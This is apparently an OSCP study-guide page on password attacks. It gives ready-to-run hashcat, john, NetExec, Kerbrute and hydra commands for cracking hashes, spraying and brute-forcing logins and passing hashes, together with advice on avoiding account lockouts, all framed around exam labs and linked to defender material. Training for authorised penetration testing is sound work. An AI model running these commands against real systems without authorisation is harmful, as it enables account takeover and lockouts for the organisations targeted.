---
title: Password Attacks
tags:
  - oscp
---

# Password Attacks { #password-attacks }

<div class="dfir-meta" markdown>
**Applies to:** standalones and the AD set · **Priority:** High · **Last updated:** 2026-11-03
</div>

!!! abstract "In one sentence"
    Identify the hash, pick the right cracking mode, crack offline with hashcat / john — and spray online carefully, because one lockout can cost you the AD set.

## 1. Concept { #concept }

| Attack | Where | Risk | Tool |
|---|---|---|---|
| **Offline cracking** | Hashes you've dumped / roasted / captured | None to the target | hashcat, john |
| **Password spraying** | One password × many users | Account lockout | NetExec, Kerbrute |
| **Brute force** | Many passwords × one user | Lockout, slow, noisy | hydra, NetExec |
| **Reuse / pass-the-hash** | A found credential on every service | Low | NetExec, evil-winrm, Impacket |

Order of preference on the exam: **reuse first, crack offline second, spray third, brute force last.**

## 2. Main tools { #tools }

| Tool | Use it for | Exam status |
|---|---|---|
| **hashcat** | GPU/CPU offline cracking, rules | Allowed |
| **john** + `*2john` scripts | Cracking file formats (ZIP, SSH key, KeePass, PDF), quick runs | Allowed |
| **hydra** | Online brute force: SSH, FTP, HTTP forms, RDP, … | Allowed |
| **NetExec** | Spraying SMB / WinRM / LDAP / MSSQL / RDP, hash reuse | Allowed |
| **Kerbrute** | Kerberos user enumeration and spraying | Allowed |
| **hashid / hashcat `--identify`** | What kind of hash is this? | Allowed |

## 3. Scenarios { #scenarios }

### 3.1 Identify the hash { #identify }

```bash
hashcat --identify hash.txt
hashid -m 'HASH_HERE'
```

| Hash | Looks like | hashcat `-m` | john `--format` |
|---|---|---|---|
| MD5 | 32 hex | 0 | raw-md5 |
| SHA1 | 40 hex | 100 | raw-sha1 |
| SHA-256 | 64 hex | 1400 | raw-sha256 |
| md5crypt | `$1$...` | 500 | md5crypt |
| sha512crypt (`/etc/shadow`) | `$6$...` | 1800 | sha512crypt |
| bcrypt | `$2y$` / `$2a$` | 3200 | bcrypt |
| NTLM | 32 hex (from SAM / secretsdump) | 1000 | nt |
| NetNTLMv2 | `user::DOMAIN:challenge:...` | 5600 | netntlmv2 |
| Kerberoast RC4 / AES256 | `$krb5tgs$23$` / `$krb5tgs$18$` | 13100 / 19700 | krb5tgs |
| AS-REP | `$krb5asrep$23$` | 18200 | krb5asrep |
| DCC2 (cached domain logon) | `$DCC2$10240#user#...` | 2100 | mscash2 |
| KeePass | `keepass2john` output | 13400 | KeePass |

### 3.2 hashcat — offline cracking { #hashcat }

**Situation:** You have `kerb.hash` from `GetUserSPNs`, or NTLM hashes from `secretsdump`.

```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerb.hash --show                 # already cracked?
hashcat -m 1000 ntlm.txt rockyou.txt --username   # input lines "user:hash"
```

**What to read:** `Status...........: Cracked` and the `hash:password` line; `Exhausted` → try a rule, a custom wordlist, or accept it's not meant to crack.

**Next:** test the password everywhere (3.5). An uncrackable NTLM hash is still usable — **pass it** instead.

!!! tip "In a VM without a GPU"
    hashcat on CPU is slow for `-m 1800` (sha512crypt) and `-m 3200` (bcrypt). The intended OSCP passwords are almost always in `rockyou.txt`; if a slow hash doesn't fall in ~10 minutes, look for another path rather than waiting hours.

### 3.3 john — files and formats { #john }

**Situation:** A protected file: `backup.zip`, `id_rsa` with a passphrase, `Database.kdbx`, a PDF.

```bash
zip2john backup.zip > zip.hash
ssh2john id_rsa > ssh.hash
keepass2john Database.kdbx > kp.hash
pdf2john file.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash
john --show kp.hash
```

**Next:** KeePass → open with `kpcli` or KeePassXC and read every entry (they usually hold the next credential); SSH key → `ssh -i id_rsa user@$IP`.

`/etc/shadow` + `/etc/passwd`: `unshadow passwd shadow > unsh.txt; john --wordlist=rockyou.txt unsh.txt`.

### 3.4 Custom wordlists { #wordlists }

**Situation:** `rockyou.txt` failed, but the target has a theme (company name, product, season).

```bash
cewl http://$IP -d 2 -m 5 -w loot/cewl.txt                     # words from the website
hashcat --stdout loot/cewl.txt -r /usr/share/hashcat/rules/best64.rule > loot/mutated.txt
printf 'Spring2026!\nSummer2026!\nAutumn2026!\nFall2026!\nWinter2026!\nCompany123!\n' > loot/seasons.txt
```

### 3.5 Credential reuse and spraying — NetExec { #spraying }

**Situation:** You cracked one password, or the AD set gave you one, and you have a user list.

```bash
# ALWAYS read the policy first
nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol

# one password, all users (domain)
nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success
# one credential, all hosts and protocols
nxc smb 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc winrm 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc mssql 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc rdp 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
# local accounts (same local admin password on many hosts)
nxc smb 10.10.120.0/24 -u administrator -H <NT> --local-auth
# username = password
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**What to read:**

- `[+] CORP\svc_web:Found_Pass1` → valid.
- `(Pwn3d!)` → local admin → secretsdump / psexec / wmiexec on that host.
- `STATUS_PASSWORD_EXPIRED` / `STATUS_ACCOUNT_RESTRICTION` → valid password but a restriction (try other protocols, or `smbpasswd -r` to change an expired one).
- `STATUS_ACCOUNT_LOCKED_OUT` → **stop spraying.**

!!! warning "Lockout math"
    `Account Lockout Threshold: 5` and an observation window of 30 min → at most **4 attempts per user per 30 minutes**, including attempts you've already made. `Threshold: 0` / `None` → no lockout. When in doubt, spray one password, wait, then the next.

### 3.6 Kerbrute — users and spraying over Kerberos { #kerbrute }

**Situation:** You have the DC but no valid user yet (or want to validate a name list quickly).

```bash
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o loot/kb-users.txt
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2026!'
```

**What to read:** `VALID USERNAME: jdoe@corp.local`; Kerbrute also flags users without pre-auth (→ [AS-REP roast](active-directory.md#asrep)). Kerberos pre-auth failures *do* count toward lockout — same lockout math applies.

### 3.7 hydra — online brute force { #hydra }

**Situation:** A login with a known username and no lockout (SSH, FTP, a web form), and nothing better left.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
hydra -L users.txt -P passwords.txt ftp://$IP
# HTTP POST form — copy the field names and failure string from Burp
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" -t 16
# HTTP basic auth
hydra -l admin -P rockyou.txt $IP http-get /admin/
```

**What to read:** `[22][ssh] host: ... login: admin password: ...`. Many false positives? Your failure string `F=` is wrong — check the response in Burp.

!!! note "Brute force is allowed, but"
    It is slow and almost never the intended path on OSCP. Limit runs to a confirmed user and a sensible list (top few thousand), and keep it in the background while you enumerate.

## 4. Common mistakes { #mistakes }

- **Spraying before reading the password policy** — locking out the given AD user can end the set.
- **Wrong hashcat mode** (`13100` vs `19700`, `5600` vs `5500`) → "Token length exception".
- **Leaving the `user:` prefix** in the hash file without `--username`.
- **Forgetting hashes are credentials.** NTLM never needs cracking for SMB / WinRM — pass it.
- **Not trying cracked passwords for other users** (password reuse across accounts is a staple).
- **Brute forcing SSH with rockyou** instead of enumerating.

## 5. Exam tips { #exam-tips }

- Keep `creds.txt` as `user:password:source` and `hashes.txt` as `user:hash:source`; re-spray the whole list every time it grows.
- Run hashcat in its own tmux pane and keep working.
- Report: note how each credential was obtained (file, hash type, wordlist) — it's part of reproducibility.

## Related pages

- [Exam workflow](exam-workflow.md) · [Active Directory](active-directory.md) · [Recon & enumeration](recon-enumeration.md)
- Defender view: [Kerberoasting](../../adversary/kerberoasting.md) · [AS-REP Roasting](../../adversary/asrep-roasting.md) · [Pass-the-Hash](../../adversary/pass-the-hash.md) · [Windows event IDs](../../basics/windows-event-ids.md) (4625, 4771, 4776)
- [Lab: Kerberoasting](labs/kerberoasting.md)

## References

- [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [NetExec wiki](https://www.netexec.wiki/)
- [Kerbrute](https://github.com/ropnop/kerbrute)
